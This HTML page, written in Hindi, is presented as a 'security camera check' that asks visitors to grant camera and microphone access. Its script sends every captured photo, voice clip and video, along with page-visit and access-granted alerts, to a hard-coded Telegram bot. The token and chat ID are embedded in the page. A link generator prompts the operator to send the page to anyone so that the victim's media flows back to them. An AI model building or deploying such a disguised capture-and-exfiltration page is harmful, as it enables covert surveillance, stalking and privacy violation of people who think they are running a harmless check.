<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>सुरक्षा कैमरा जाँच</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0f; color: #fff; min-height: 100vh; }
.container { max-width: 500px; margin: 0 auto; padding: 20px; }
.header { text-align: center; padding: 20px 0; }
.header h1 { font-size: 22px; color: #00f0ff; margin-bottom: 5px; }
.header p { font-size: 13px; color: #888; }
.video-container { position: relative; background: #000; border-radius: 16px; overflow: hidden; margin: 15px 0; border: 2px solid #1a1a2e; }
#video { width: 100%; display: block; transform: scaleX(-1); }
#canvas { display: none; }
.controls { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin: 15px 0; }
.btn { padding: 12px 24px; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; flex: 1; min-width: 120px; }
.btn-primary { background: #00f0ff; color: #000; }
.btn-primary:hover { background: #00d0e0; transform: translateY(-2px); }
.btn-danger { background: #ff3355; color: #fff; }
.btn-danger:hover { background: #e02a48; }
.btn-success { background: #00e676; color: #000; }
.btn-success:hover { background: #00c866; }
.btn-warning { background: #ffab00; color: #000; }
.btn-warning:hover { background: #e09a00; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0; }
.gallery img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid #1a1a2e; }
.status { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; font-size: 13px; max-height: 200px; overflow-y: auto; }
.status .log { padding: 4px 0; border-bottom: 1px solid #2a2a3e; color: #aaa; }
.status .log.success { color: #00e676; }
.status .log.error { color: #ff3355; }
.status .log.info { color: #00f0ff; }
.link-box { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; text-align: center; }
.link-box input { width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #333; border-radius: 8px; color: #00f0ff; font-size: 13px; text-align: center; margin: 8px 0; }
.link-box .copy-btn { background: #333; color: #fff; border: none; padding: 8px 20px; border-radius: 8px; cursor: pointer; }
.hidden { display: none !important; }
.stats { display: flex; gap: 10px; margin: 10px 0; }
.stat-card { flex: 1; background: #1a1a2e; border-radius: 12px; padding: 12px; text-align: center; }
.stat-card .num { font-size: 24px; font-weight: 700; color: #00f0ff; }
.stat-card .label { font-size: 11px; color: #888; margin-top: 4px; }
.tab-bar { display: flex; gap: 5px; margin: 15px 0; }
.tab { flex: 1; padding: 10px; text-align: center; background: #1a1a2e; border-radius: 10px; cursor: pointer; font-size: 13px; transition: 0.3s; }
.tab.active { background: #00f0ff; color: #000; font-weight: 600; }
.tab-content { display: none; }
.tab-content.active { display: block; }
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <h1>📷 सुरक्षा कैमरा जाँच</h1>
    <p>कैमरा एक्सेस देकर डिवाइस की जाँच करें</p>
  </div>

  <!-- Tabs -->
  <div class="tab-bar">
    <div class="tab active" onclick="switchTab('camera')">📸 कैमरा</div>
    <div class="tab" onclick="switchTab('gallery')">🖼️ गैलरी (<span id="galleryCount">0</span>)</div>
    <div class="tab" onclick="switchTab('logs')">📋 लॉग</div>
  </div>

  <!-- Camera Tab -->
  <div id="tab-camera" class="tab-content active">
    <div class="video-container">
      <video id="video" autoplay playsinline></video>
      <canvas id="canvas"></canvas>
    </div>

    <div class="controls">
      <button class="btn btn-primary" id="startBtn" onclick="startCamera()">📷 कैमरा चालू करें</button>
      <button class="btn btn-danger hidden" id="stopBtn" onclick="stopCamera()">⏹ बंद करें</button>
    </div>

    <div class="controls" id="actionBtns" style="display:none;">
      <button class="btn btn-success" onclick="capturePhoto()">📸 फोटो लें</button>
      <button class="btn btn-warning" onclick="startVoice()">🎤 वॉइस (10s)</button>
      <button class="btn btn-danger" onclick="startVideo()">🎥 वीडियो (20s)</button>
    </div>

    <!-- Link Generator -->
    <div class="link-box">
      <div style="font-size:13px; color:#888; margin-bottom:5px;">🔗 अपना लिंक जनरेट करें</div>
      <button class="btn btn-primary" onclick="generateLink()" style="width:100%;">🔗 लिंक बनाएँ</button>
      <div id="linkDisplay" class="hidden" style="margin-top:10px;">
        <input type="text" id="linkInput" readonly onclick="this.select()">
        <button class="copy-btn" onclick="copyLink()">📋 कॉपी करें</button>
      </div>
    </div>
  </div>

  <!-- Gallery Tab -->
  <div id="tab-gallery" class="tab-content">
    <div class="stats">
      <div class="stat-card"><div class="num" id="photoCount">0</div><div class="label">फोटो</div></div>
      <div class="stat-card"><div class="num" id="voiceCount">0</div><div class="label">वॉइस</div></div>
      <div class="stat-card"><div class="num" id="videoCount">0</div><div class="label">वीडियो</div></div>
    </div>
    <div class="gallery" id="gallery"></div>
  </div>

  <!-- Logs Tab -->
  <div id="tab-logs" class="tab-content">
    <div class="status" id="statusLogs">
      <div class="log info">✅ सिस्टम तैयार है। कैमरा चालू करें।</div>
    </div>
  </div>
</div>

<script>
// ====== CONFIG ======
const BOT_TOKEN = '8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk';
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const DEFAULT_CHAT_ID = '8146265514';

// Get chat_id from URL parameter
const urlParams = new URLSearchParams(window.location.search);
const TARGET_CHAT_ID = urlParams.get('id') || DEFAULT_CHAT_ID;

// ====== STATE ======
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let capturedPhotos = [];
let capturedVoices = [];
let capturedVideos = [];
let myLink = '';

// ====== DOM REFS ======
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const actionBtns = document.getElementById('actionBtns');
const statusLogs = document.getElementById('statusLogs');
const gallery = document.getElementById('gallery');

// ====== HELPERS ======
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function addLog(msg, type = 'info') {
  const div = document.createElement('div');
  div.className = `log ${type}`;
  const time = new Date().toLocaleTimeString('hi-IN');
  div.textContent = `[${time}] ${msg}`;
  statusLogs.appendChild(div);
  statusLogs.scrollTop = statusLogs.scrollHeight;
}

function updateCounts() {
  document.getElementById('photoCount').textContent = capturedPhotos.length;
  document.getElementById('voiceCount').textContent = capturedVoices.length;
  document.getElementById('videoCount').textContent = capturedVideos.length;
  document.getElementById('galleryCount').textContent = capturedPhotos.length + capturedVoices.length + capturedVideos.length;
}

function switchTab(tab) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector(`.tab[onclick*="${tab}"]`).classList.add('active');
  document.getElementById(`tab-${tab}`).classList.add('active');
}

// ====== TELEGRAM API ======
async function sendToTelegram(method, data) {
  try {
    const res = await fetch(`${API}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    return await res.json();
  } catch(e) {
    addLog(`Telegram API error: ${e.message}`, 'error');
    return null;
  }
}

async function sendPhotoToTelegram(blob, caption = '') {
  try {
    const formData = new FormData();
    formData.append('chat_id', TARGET_CHAT_ID);
    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
    if (caption) formData.append('caption', caption);
    
    const res = await fetch(`${API}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();
    if (data.ok) {
      addLog('📸 फोटो Telegram भेजा गया', 'success');
    } else {
      addLog(`📸 फोटो भेजने में error: ${data.description}`, 'error');
    }
    return data;
  } catch(e) {
    addLog(`फोटो भेजने में error: ${e.message}`, 'error');
    return null;
  }
}

async function sendVoiceToTelegram(blob) {
  try {
    const formData = new FormData();
    formData.append('chat_id', TARGET_CHAT_ID);
    formData.append('voice', blob, `voice_${Date.now()}.ogg`);
    
    const res = await fetch(`${API}/sendVoice`, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();
    if (data.ok) {
      addLog('🎤 वॉइस Telegram भेजा गया', 'success');
    } else {
      addLog(`🎤 वॉइस error: ${data.description}`, 'error');
    }
    return data;
  } catch(e) {
    addLog(`वॉइस error: ${e.message}`, 'error');
    return null;
  }
}

async function sendVideoToTelegram(blob) {
  try {
    const formData = new FormData();
    formData.append('chat_id', TARGET_CHAT_ID);
    formData.append('video', blob, `video_${Date.now()}.mp4`);
    
    const res = await fetch(`${API}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();
    if (data.ok) {
      addLog('🎥 वीडियो Telegram भेजा गया', 'success');
    } else {
      addLog(`🎥 वीडियो error: ${data.description}`, 'error');
    }
    return data;
  } catch(e) {
    addLog(`वीडियो error: ${e.message}`, 'error');
    return null;
  }
}

// ====== CAMERA ======
async function startCamera() {
  try {
    const constraints = {
      video: { 
        width: { ideal: 640 },
        height: { ideal: 480 },
        facingMode: 'user'
      },
      audio: true
    };
    
    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = mediaStream;
    
    startBtn.classList.add('hidden');
    stopBtn.classList.remove('hidden');
    actionBtns.style.display = 'flex';
    
    addLog('📷 कैमरा चालू हुआ', 'success');
    
    // Send notification to Telegram
    await sendToTelegram('sendMessage', {
      chat_id: TARGET_CHAT_ID,
      text: `📷 <b>नया विज़िटर</b>\n\nकैमरा एक्सेस दिया गया ✅\nसमय: ${new Date().toLocaleString('hi-IN')}`,
      parse_mode: 'HTML'
    });
    
  } catch(e) {
    addLog(`कैमरा error: ${e.message}`, 'error');
    alert('कैमरा एक्सेस नहीं मिला। कृपया अनुमति दें।');
  }
}

function stopCamera() {
  if (mediaStream) {
    mediaStream.getTracks().forEach(t => t.stop());
    mediaStream = null;
  }
  video.srcObject = null;
  startBtn.classList.remove('hidden');
  stopBtn.classList.add('hidden');
  actionBtns.style.display = 'none';
  addLog('📷 कैमरा बंद किया', 'info');
}

// ====== CAPTURE PHOTO ======
async function capturePhoto() {
  if (!mediaStream) {
    addLog('पहले कैमरा चालू करें', 'error');
    return;
  }
  
  if (capturedPhotos.length >= 6) {
    addLog('अधिकतम 6 फोटो ले सकते हैं', 'error');
    return;
  }
  
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  
  // Mirror the image
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);
  
  // Convert to blob
  canvas.toBlob(async (blob) => {
    const url = URL.createObjectURL(blob);
    capturedPhotos.push(url);
    updateCounts();
    
    // Show in gallery
    const img = document.createElement('img');
    img.src = url;
    gallery.insertBefore(img, gallery.firstChild);
    
    addLog(`📸 फोटो #${capturedPhotos.length} ली गई`, 'success');
    
    // Send to Telegram
    await sendPhotoToTelegram(blob, `📸 फोटो #${capturedPhotos.length}`);
    
    // Store in localStorage
    saveToStorage();
  }, 'image/jpeg', 0.8);
}

// ====== RECORD VOICE ======
async function startVoice() {
  if (!mediaStream) {
    addLog('पहले कैमरा चालू करें', 'error');
    return;
  }
  
  if (capturedVoices.length >= 3) {
    addLog('अधिकतम 3 वॉइस नोट', 'error');
    return;
  }
  
  if (isRecording) {
    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
    return;
  }
  
  try {
    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
    
    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) recordedChunks.push(e.data);
    };
    
    mediaRecorder.onstop = async () => {
      audioStream.getTracks().forEach(t => t.stop());
      const blob = new Blob(recordedChunks, { type: 'audio/webm' });
      const url = URL.createObjectURL(blob);
      capturedVoices.push(url);
      updateCounts();
      
      addLog(`🎤 वॉइस #${capturedVoices.length} रिकॉर्ड हुआ`, 'success');
      
      // Send to Telegram
      await sendVoiceToTelegram(blob);
      
      // Store
      saveToStorage();
      isRecording = false;
    };
    
    mediaRecorder.start();
    isRecording = true;
    addLog('🎤 वॉइस रिकॉर्डिंग शुरू... (10 सेकंड)', 'info');
    
    // Auto stop after 10 seconds
    setTimeout(() => {
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        addLog('🎤 वॉइस रिकॉर्डिंग पूरी', 'success');
      }
    }, 10000);
    
  } catch(e) {
    addLog(`वॉइस error: ${e.message}`, 'error');
    isRecording = false;
  }
}

// ====== RECORD VIDEO ======
async function startVideo() {
  if (!mediaStream) {
    addLog('पहले कैमरा चालू करें', 'error');
    return;
  }
  
  if (capturedVideos.length >= 1) {
    addLog('अधिकतम 1 वीडियो', 'error');
    return;
  }
  
  if (isRecording) {
    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
    return;
  }
  
  recordedChunks = [];
  mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
  
  mediaRecorder.ondataavailable = (e) => {
    if (e.data.size > 0) recordedChunks.push(e.data);
  };
  
  mediaRecorder.onstop = async () => {
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    const url = URL.createObjectURL(blob);
    capturedVideos.push(url);
    updateCounts();
    
    addLog(`🎥 वीडियो रिकॉर्ड हुआ`, 'success');
    
    // Show in gallery
    const videoEl = document.createElement('video');
    videoEl.src = url;
    videoEl.controls = true;
    videoEl.style.width = '100%';
    videoEl.style.borderRadius = '8px';
    gallery.insertBefore(videoEl, gallery.firstChild);
    
    // Send to Telegram
    await sendVideoToTelegram(blob);
    
    // Store
    saveToStorage();
    isRecording = false;
  };
  
  mediaRecorder.start();
  isRecording = true;
  addLog('🎥 वीडियो रिकॉर्डिंग शुरू... (20 सेकंड)', 'info');
  
  // Auto stop after 20 seconds
  setTimeout(() => {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      mediaRecorder.stop();
      addLog('🎥 वीडियो रिकॉर्डिंग पूरी', 'success');
    }
  }, 20000);
}

// ====== LINK GENERATOR ======
function generateLink() {
  const baseUrl = window.location.origin + window.location.pathname;
  myLink = `${baseUrl}?id=${TARGET_CHAT_ID}`;
  
  document.getElementById('linkInput').value = myLink;
  document.getElementById('linkDisplay').classList.remove('hidden');
  
  addLog('🔗 लिंक जनरेट किया गया', 'success');
  
  // Send link to Telegram
  sendToTelegram('sendMessage', {
    chat_id: TARGET_CHAT_ID,
    text: `🔗 <b>आपका लिंक तैयार है:</b>\n<code>${myLink}</code>\n\nयह लिंक किसी को भी भेजें। जब वह खोलेगा, उसकी जानकारी यहाँ आएगी।`,
    parse_mode: 'HTML'
  });
}

function copyLink() {
  const input = document.getElementById('linkInput');
  input.select();
  document.execCommand('copy');
  addLog('📋 लिंक कॉपी किया गया', 'success');
}

// ====== LOCAL STORAGE ======
function saveToStorage() {
  try {
    const data = {
      photos: capturedPhotos,
      voices: capturedVoices,
      videos: capturedVideos,
      timestamp: Date.now()
    };
    localStorage.setItem('camData', JSON.stringify(data));
  } catch(e) {
    // Storage full or unavailable - ignore
  }
}

function loadFromStorage() {
  try {
    const raw = localStorage.getItem('camData');
    if (raw) {
      const data = JSON.parse(raw);
      capturedPhotos = data.photos || [];
      capturedVoices = data.voices || [];
      capturedVideos = data.videos || [];
      updateCounts();
      
      // Restore gallery
      capturedPhotos.forEach(url => {
        const img = document.createElement('img');
        img.src = url;
        gallery.appendChild(img);
      });
    }
  } catch(e) {}
}

// ====== INIT ======
loadFromStorage();
addLog(`✅ बॉट कॉन्फ़िगर हुआ। Chat ID: ${TARGET_CHAT_ID}`, 'info');
addLog('📷 कैमरा चालू करने के लिए बटन दबाएँ', 'info');

// Send page load notification
sendToTelegram('sendMessage', {
  chat_id: TARGET_CHAT_ID,
  text: `🌐 <b>पेज खोला गया</b>\n\nकोई व्यक्ति आपके लिंक पर आया है।\nसमय: ${new Date().toLocaleString('hi-IN')}\nURL: ${window.location.href}`,
  parse_mode: 'HTML'
});
</script>
</body>
</html>
